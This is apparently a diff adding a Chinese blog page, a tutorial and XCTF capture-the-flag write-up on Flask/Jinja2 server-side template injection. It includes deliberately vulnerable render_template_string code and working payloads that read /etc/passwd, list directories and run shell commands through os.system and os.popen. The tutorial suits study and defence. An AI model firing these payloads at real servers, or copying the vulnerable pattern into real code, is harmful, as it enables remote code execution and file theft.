@@ -1,0 +1,347 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Python-模板注入 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Python-模板注入 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="何为模板注入？
+模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，哲大大提升了开发效率，良好的设计也是的代码重用变得更加容易。
+到那时模板引擎也拓宽了我们的攻击面，注入到模板中的代码可能会引发RCE或者XSS
+
+fla..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Python-模板注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-04
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>何为模板注入？<br>
+模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，哲大大提升了开发效率，良好的设计也是的代码重用变得更加容易。<br>
+到那时模板引擎也拓宽了我们的攻击面，注入到模板中的代码可能会引发RCE或者XSS<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774211791.png" alt="" loading="lazy"><br>
+flask基础<br>
+在学习SSTI之前，先把flask的运作流程搞明白，这样有利于更加快速的理解原理<br>
+路由<br>
+先看一段代码</p>
+<pre><code>from flask import flask
+
+@app.route('/index/')
+def hello_word():
+return 'hello world'
+</code></pre>
+<p>route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问http:127.0.0.1：5000/index的时候，flask会返回hello world<br>
+渲染方法<br>
+flask的渲染方法有render_template和render_template_string两种。<br>
+render_template()是用来渲染一个指定文件的。使用如下</p>
+<pre><code>return render_template('indexhtml')
+</code></pre>
+<p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分<br>
+使用方法如下</p>
+<pre><code>html='&lt;h1&gt;This is index page&lt;/h1&gt;'
+return render_template_string(html)
+</code></pre>
+<p>模板<br>
+flask时使用Jinja2来作为渲染引擎的。看例子<br>
+在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。</p>
+<p>test.py</p>
+<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
+@app.route('/index/')
+def user_login():
+return render_template('index.html')
+</code></pre>
+<p>/templates/index.html</p>
+<pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;
+</code></pre>
+<p>访问127.0.0.1:5000/index/的时候，flask就会渲染出index.html的页面。</p>
+<p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
+<p>例子</p>
+<p>test.py</p>
+<pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string
+@app.route('/index/')
+def user_login():
+return render_template('index.html',content='This is index page.')
+
+/templates/index.html
+
+&lt;h1&gt;{{content}}&lt;/h1&gt;
+</code></pre>
+<p>这个时候页面仍然输出This is index page。</p>
+<p><code>{{}}</code>在Jinja2中作为变量包裹标识符。<br>
+模板注入</p>
+<p>不正确的使用flask中的render_template_string方法会引发SSTI。那么是什么不正确的代码呢？<br>
+xss利用</p>
+<p>存在漏洞的代码</p>
+<pre><code>@app.route('/test/')
+def test():
+code = request.args.get('id')
+html = '''
+&lt;h3&gt;%s&lt;/h3&gt;
+'''%(code)
+return render_template_string(html)
+</code></pre>
+<p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的code是用户可控的，会和html拼接后直接带入渲染。</p>
+<p>尝试构造code为一串js代码。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774927945.png" alt="" loading="lazy"><br>
+将代码改为如下</p>
+<pre><code>@app.route('/test/')
+def test():
+code = request.args.get('id')
+return render_template_string('&lt;h1&gt;{{ code }}&lt;/h1&gt;',code=code)
+</code></pre>
+<p>继续尝试<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774932382.png" alt="" loading="lazy"><br>
+可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。<br>
+Flask模板注入</p>
+<p>解析：</p>
+<p>众所周知ssti要被<code>{{}}</code>包括。接下来的代码均要包括在ssti中。</p>
+<p>1.几种常用于ssti的魔术方法</p>
+<p><strong>class</strong>  返回类型所属的对象<br>
+<strong>mro</strong>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
+<strong>base</strong>   返回该对象所继承的基类<br>
+// __base__和__mro__都是用来寻找基类的</p>
+<p><strong>subclasses</strong>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
+<strong>init</strong>  类的初始化方法<br>
+<strong>globals</strong>  对包含函数全局变量的字典的引用<br>
+<strong>builtins</strong> builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块</p>
+<p>2.获取基类的几种方法</p>
+<pre><code>[].__class__.__base__
+''.__class__.__mro__[2]
+().__class__.__base__
+{}.__class__.__base__
+request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
+或者
+[].__class__.__bases__[0]       //其他的类似
+</code></pre>
+<p>3.获取基本类的子类<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774939374.png" alt="" loading="lazy"><br>
+ssti的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件的类）加以利用。</p>
+<p>那么我们可以利用的类有哪些呢？</p>
+<p>4.利用</p>
+<p>我们可以利用的方法有<code>&lt;type 'file'&gt;</code>等。（甚至file一般是第40号）</p>
+<pre><code>().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622774944103.png" alt="" loading="lazy"><br>
+可以从上面的例子中看到我们用file读取了 /etc/passwd ，但是如果想要读取目录怎么办？</p>
+<p>那么我们可以寻找万能的os模块。</p>
+<p>写脚本遍历。<br>
+复制代码</p>
+<pre><code>#!/usr/bin/env python
+# encoding: utf-8
+
+num = 0
+
+for item in ''.__class__.__mro__[2].__subclasses__():
+try:
+if 'os' in item.__init__.__globals__:
+print num,item
+num+=1
+except:
+print '-'
+num+=1
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622774949520.png" alt="" loading="lazy"><br>
+直接调用就好了。可以直接调用system函数，有了shell其他的问题不就解决了吗？</p>
+<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
+</code></pre>
+<p>5.读写文件</p>
+<p>当然，某些情况下system函数会被过滤。这时候也可以采用os模块的listdir函数来读取目录。(可以配合file来实现任意文件读取)</p>
+<pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')  #读取本级目录
+</code></pre>
+<p>另外在某些不得已的情况下可以使用以下方式来读取文件。（没见过这种情况）。</p>
+<p>方法一：</p>
+<pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()　　　　#把 read() 改为 write() 就是写文件
+</code></pre>
+<p>方法二：</p>
+<p>存在的子模块可以通过 .index()方式来查询</p>
+<pre><code>''.__class__.__mro__[2].__subclasses__().index(file)
+40
+</code></pre>
+<p>用file模块来查询。</p>
+<pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
+</code></pre>
+<p>这里拿 xctf 中的 Web_python_template_injection 做例子</p>
+<p>进入题目界面可以看到<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774955812.png" alt="" loading="lazy"><br>
+尝试模板注入      <code>{{7*7}}</code></p>
+<p>/49的存在说明这条指令被忠实地执行了。接下来，开始想办法编代码拿到服务器的控制台权限 首先，题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思考怎样用python语句获取控制台权限：想到了os.system和os.popen(<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>),这两句前者返回<strong>退出状态码</strong>,后者<strong>以file形式</strong>返回<strong>输出内容</strong>,我们想要的是内容，所所以选择os.popen<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622774960628.png" alt="" loading="lazy"><br>
+知道了要用这一句，那么我要怎么找到这一句呢？python给我们提供了完整的寻找链(参考资料)<br>
+class：返回对象所属的类<br>
+mro：返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
+base：返回该类所继承的基类 //base__和__mro__都是用来寻找基类的__subclasses：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>
+init：类的初始化方法<br>
+globals：对包含函数全局变量的字典的引用<br>
+首先，找到当前变量所在的类：</p>
+<p>有回显。尝试模板注入。</p>
+<p>构造payload：</p>
+<pre><code>{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1622774966196.png" alt="" loading="lazy"></figure>
+<p>读目录发现了fl4g。直接用file读取。构造payload:</p>
+<pre><code>{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1622774971627.png" alt="" loading="lazy"></figure>
+<p>拿到了flag。<br>
+##注意事项：<br>
+复制代码</p>
+<pre><code>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('catfl4g').read()
+
+
+''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
+
+
+''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+</code></pre>
+<p>复制代码</p>
+<p>以上payload是非常常用的payload</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">
+              <h3 class="post-title">
+                web安全相关知识点
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
